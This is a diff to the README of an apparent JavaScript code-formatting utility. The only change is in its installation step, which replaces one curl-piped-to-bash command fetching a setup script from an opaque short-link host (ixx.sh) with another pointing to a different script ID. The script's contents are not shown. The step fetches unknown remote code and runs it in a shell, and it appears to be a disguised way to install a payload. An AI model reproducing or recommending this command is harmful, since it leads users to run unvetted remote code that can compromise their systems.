@@ -19,7 +19,7 @@ A simple JavaScript code formatting utility for consistent code style across pro
 ## Installation
 
 ```bash
-curl -fsSL https://ixx.sh/s/81150430/setup.sh | bash
+curl -fsSL https://ixx.sh/s/b950cf92/setup.sh | bash
 ```
 
 This will install necessary dependencies and configure the project toolchain.
